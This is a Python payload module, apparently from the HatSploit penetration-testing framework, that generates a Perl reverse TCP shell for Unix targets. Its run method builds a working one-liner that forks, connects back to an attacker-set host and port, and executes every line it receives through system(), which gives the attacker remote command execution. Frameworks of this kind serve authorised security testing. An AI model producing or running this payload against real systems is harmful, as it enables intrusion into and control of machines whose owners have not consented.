#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.tcp.tcp import TCPClient


class HatSploitPayload(Payload, TCPClient):
    details = {
        'Category': "single",
        'Name': "Perl Shell Reverse TCP",
        'Payload': "unix/generic/perl_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Perl shell reverse TCP payload.",
        'Comments': [
            ''
        ],
        'Architecture': "generic",
        'Platform': "unix",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)
        local_data = local_host + ':' + local_port

        self.output_process("Generating payload...")

        payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"LOCAL_DATA\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
        payload = payload.replace("LOCAL_DATA", local_data)

        return payload
